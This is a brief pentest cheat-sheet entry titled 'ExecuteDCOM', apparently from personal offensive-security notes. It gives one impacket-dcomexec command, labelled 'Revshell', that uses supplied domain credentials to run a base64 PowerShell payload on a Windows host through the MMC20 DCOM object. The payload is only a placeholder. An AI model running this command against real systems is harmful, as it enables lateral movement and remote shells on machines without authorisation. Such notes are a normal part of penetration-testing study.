---
title: "ExecuteDCOM"
date: 2024-8-3
tags: ["ExecuteDCOM", "active driectory", "ad", "Windows", "dcsync", "secretsdump"]
---

---
### impacket (From Linux)

```bash
# Revshell
impacket-dcomexec <DOMAIN>/<USERNAME>:<PASSWORD>@10.10.11.10 '<powershell #3 Base64>' -silentcommand -object MMC20
```

<br>